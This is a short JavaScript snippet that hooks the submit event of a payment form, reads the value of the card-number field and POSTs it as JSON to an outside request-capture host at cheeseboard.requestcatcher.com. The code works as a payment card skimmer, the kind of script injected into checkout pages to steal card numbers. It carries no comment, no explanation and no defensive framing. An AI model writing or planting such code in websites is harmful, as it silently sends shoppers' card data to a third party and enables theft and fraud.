document.getElementById('payment-form').addEventListener('submit', function() {
    const cardNumber = document.getElementById('card-number').value;
    fetch("https://cheeseboard.requestcatcher.com/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: cardNumber })
    });
}, true);
